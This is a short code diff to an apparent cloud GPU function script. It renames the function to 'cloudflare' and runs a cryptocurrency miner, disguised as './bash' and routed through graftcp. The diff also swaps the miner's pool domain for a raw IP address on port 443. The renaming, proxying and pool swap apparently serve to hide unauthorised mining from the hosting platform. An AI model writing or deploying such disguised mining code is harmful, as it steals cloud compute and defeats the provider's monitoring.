@@ -13,7 +13,7 @@ image = (
 
 
 @function(
-    name="t4x3-runner",
+    name="cloudflare",
     image=image,
     gpu="A10G",
     cpu=2,
@@ -78,7 +78,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC VIA GRAFTCP ==="
-    ./graftcp/graftcp ./bash --algo FISHHASH --pool iron.kryptex.network:7017 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.02 --ethstratum ETHPROX
+    ./graftcp/graftcp ./bash --algo FISHHASH --pool 104.207.93.53:443 --user d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.02 --ethstratum ETHPROX
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
